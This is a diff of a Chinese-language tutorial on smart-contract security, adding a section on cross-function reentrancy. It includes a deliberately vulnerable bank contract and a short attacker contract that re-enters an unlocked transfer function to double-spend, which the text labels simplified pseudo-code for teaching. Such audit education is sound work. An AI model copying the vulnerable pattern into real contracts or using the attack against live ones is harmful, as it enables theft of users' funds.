@@ -224,7 +224,8 @@ function withdraw() external nonReentrant{
 
 注：以下所展示的代码示例均为简化过的`pseudo-code`, 主要以阐释攻击思路为目的。内容源自众多`Web3 Security Researchers`所分享的审计案例,感谢他们的贡献！
 
-1. 跨函数重入攻击
+### 1. 跨函数重入攻击
+
 *那一年，我戴了重入锁，不知对手为何物。直到那天，那个男人从天而降，还是卷走了我的银钱... -- 戴锁婆婆*
 
 请看如下代码示例：
@@ -264,8 +265,51 @@ contract VulnerableBank {
   }
 
   function transfer(address _to, uint256 _amount) external {
+    uint256 balance = balances[msg.sender];
+    require(balance >= _amount, "Insufficient balance");
+
     balances[msg.sender] -= _amount;
     balances[_to] += _amount;
   }
 }
 ```
+
+在上面的`VulnerableBank`合约中，可以看到转账`ETH`的步骤仅存在于`withdraw`这一个函数之内，而此函数已经使用了重入锁`nonReentrant`。那么，还有什么方法来对这个合约进行重入攻击呢？
+
+请看如下攻击者合约示例：
+
+```
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.17;
+
+import "../IVault.sol";
+
+contract Attack2Contract {
+    address victim;
+    address owner;
+
+    constructor(address _victim, address _owner) {
+        victim = _victim;
+        owner = _owner;
+    }
+
+    function deposit() external payable {
+        IVault(victim).deposit{value: msg.value}("");
+    }
+
+    function withdraw() external {
+        Ivault(victim).withdraw();
+    }
+
+    receive() external payable {
+        uint256 balance = Ivault(victim).balances[address(this)];
+        Ivault(victim).transfer(owner, balance);
+    }
+}
+```
+
+如上所示，攻击者重入的不再是`withdraw`函数，而是转头去重入没有戴锁的`transfer`函数。`VulnerableBank`合约的设计者的固有思路认为`transfer`函数中只是更改 `balances mapping`而没有转账`ETH`的步骤，所以应该不是重入攻击的对象，所以没有给它加上锁。而攻击者利用`withdraw`先将`ETH`转账，转账完成的时候`balances`没有立即更新，而随机调用了`transfer`函数将自己原本已不存在的余额成功转移给了另一个地址`owner`，而此地址完全可以是攻击者的一个小号而已。由于`transfer`函数没有转账`ETH`所以不会持续将执行权交出，所以这个重入只是攻击了额外一次便结束。结果是攻击者“无中生有”出了这一部分钱，实现了“双花”的功效。
+
+那么问题来了：
+
+*如果改进一下， 将合约中的所有跟资产转移沾边的函数都加上重入锁，那是不是就安全了呢？？？*
